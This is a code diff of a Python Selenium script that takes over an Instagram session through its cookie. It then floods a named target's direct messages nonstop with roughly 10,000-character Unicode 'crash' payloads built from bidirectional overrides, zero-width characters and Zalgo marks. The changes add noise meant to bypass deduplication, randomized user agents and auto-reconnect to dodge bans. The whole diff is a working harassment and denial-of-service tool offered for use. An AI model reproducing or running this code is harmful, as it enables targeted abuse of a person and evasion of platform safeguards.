@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (LETHAL NULL-POINTER)
-# 📅 STATUS: DENSITY x60 | PULSE-FIRE | BIDI-SPIRAL
+# 🚀 PROJECT: PRAVEER NC (GLOBAL BLACKOUT)
+# 📅 STATUS: HYPER-DENSITY x70 | AUTO-RECONNECT | REGION-ROTATION
 
 import os, time, random, sys, gc, threading
 from concurrent.futures import ThreadPoolExecutor
@@ -11,29 +11,22 @@ from selenium.webdriver.chrome.options import Options
 
 # --- MATRIX CONFIG ---
 THREADS_PER_MACHINE = 2
-MACHINE_ID = os.getenv("MACHINE_ID", "1")
+MACHINE_ID = os.getenv("MACHINE_ID", "GLOBAL")
 
-def get_lethal_payload(target_name):
-    """The Null-Pointer: x60 Density + Memory Buffer Overflow."""
+def get_hyper_payload(target_name):
     u_id = random.randint(100000, 999999)
-    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 LTHL_{MACHINE_ID}_{u_id}\n"
-    
-    # 💥 THE 'SPIRAL' (Directional Paradox + Null-Width Bloat)
-    # Forces recursive layout calculations.
-    spiral = "\u202E\u2066\u202D\u2067\u200B\u200D" * 20
-    
-    # 💥 DENSITY x60 (600 Zalgo marks)
-    z_tower = "̸" * 600
-    
-    # 💥 THE 'WIDTH-ANCHOR'
-    width_anchor = "\u2800\u00A0" * 180 
+    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 GLOB_{u_id}\n"
+    atom = "\u034F"
+    z_tower = "̸" * 700
+    # 7500 chars of randomized noise to bypass deduplication
+    noise = "".join(random.choice(["\u200C", "\u200D", "\u2060", "\u2063", "\u2064"]) for _ in range(7500))
 
-    lines = [header, width_anchor]
+    lines = [header, noise]
     for i in range(45):
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        lines.append(f"{width_anchor}{prefix}{target_name.upper()}{z_tower}{spiral}")
+        lines.append(f"\u2800\u00A0{atom}{prefix}{target_name.upper()}{z_tower}")
     
-    return "\n".join(lines)[:9995]
+    return "\n".join(lines)[:10000]
 
 def get_driver():
     chrome_options = Options()
@@ -41,56 +34,54 @@ def get_driver():
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--disable-gpu")
-    # Dynamic User-Agent to avoid server-side socket bans
-    ver = random.randint(120, 122)
+    # Randomized User-Agent
+    ver = random.randint(120, 124)
     chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36")
     return webdriver.Chrome(options=chrome_options)
 
 def agent_blitz(agent_id, cookie, target_id, target_name):
-    driver = None
-    strike_count = 0
-    while True:
+    while True: # 🔄 AUTO-RECONNECT LOOP
+        driver = None
         try:
+            print(f"📡 [M{MACHINE_ID}-A{agent_id}] CONNECTING TO GLOBAL GRID...")
             driver = get_driver()
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
             time.sleep(10)
             driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
-            time.sleep(12)
+            time.sleep(15)
 
+            strike_count = 0
             while True:
-                # 🔥 PULSE-FIRE: 5 STRIKES IN A BURST
-                for _ in range(5):
-                    try:
-                        box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
-                        payload = get_lethal_payload(target_name)
-                        
-                        driver.execute_script("""
-                            var box = arguments[0];
-                            document.execCommand('insertText', false, arguments[1]);
-                            box.dispatchEvent(new Event('input', { bubbles: true }));
-                        """, box, payload)
-                        
-                        box.send_keys(Keys.ENTER)
-                        strike_count += 1
-                        print(f"💀 [M{MACHINE_ID}-A{agent_id}] PULSE STRIKE {strike_count}", flush=True)
-                        
-                        driver.execute_script("window.stop();")
-                        time.sleep(0.01) # Near-zero delay between pulse rounds
-                    except: break
-
-                # ⏳ COOLDOWN: Let the target's RAM saturate
-                time.sleep(1.5)
-                
-                # Periodic Refresh to keep the runner account active
-                if strike_count % 30 == 0:
+                # 🚀 SOCKET HEALTH CHECK
+                if strike_count > 20:
+                    print(f"🔄 [M{MACHINE_ID}-A{agent_id}] ROTATING SOCKET...")
                     driver.refresh()
-                    time.sleep(8)
+                    time.sleep(10)
+                    strike_count = 0
 
-        except Exception:
+                box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
+                payload = get_hyper_payload(target_name)
+                
+                driver.execute_script("""
+                    var box = arguments[0];
+                    document.execCommand('insertText', false, arguments[1]);
+                    box.dispatchEvent(new Event('input', { bubbles: true }));
+                """, box, payload)
+                
+                box.send_keys(Keys.ENTER)
+                strike_count += 1
+                print(f"💀 [M{MACHINE_ID}-A{agent_id}] HYPER-STRIKE {strike_count} DELIVERED", flush=True)
+                
+                # KILL LOCAL RENDER
+                driver.execute_script("window.stop();")
+                time.sleep(0.02)
+
+        except Exception as e:
+            print(f"⚠️ [M{MACHINE_ID}-A{agent_id}] CONNECTION LOST. REBOOTING...")
             if driver: driver.quit()
-            time.sleep(5)
+            time.sleep(10) # Wait before getting a new session/IP
             continue
 
 def main():
